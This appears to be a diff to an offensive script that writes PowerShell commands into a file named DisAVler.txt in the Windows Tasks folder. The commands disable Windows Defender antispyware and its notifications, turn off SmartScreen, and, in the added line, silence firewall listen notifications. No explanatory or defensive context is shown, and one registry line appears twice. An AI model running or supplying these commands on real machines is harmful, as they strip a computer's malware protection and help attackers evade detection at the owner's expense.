@@ -1,4 +1,5 @@
 echo 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Type DWord -Value 1;' > C:\Windows\Tasks\DisAVler.txt;
+echo 'Set-NetFirewallProfile -Profile Domain,Private,Public -NotifyOnListen 0 -ErrorAction SilentlyContinue;' >> C:\Windows\Tasks\DisAVler.txt;
 echo 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1;' >> C:\Windows\Tasks\DisAVler.txt;
 echo 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force;' >> C:\Windows\Tasks\DisAVler.txt;
 echo 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1;' >> C:\Windows\Tasks\DisAVler.txt;
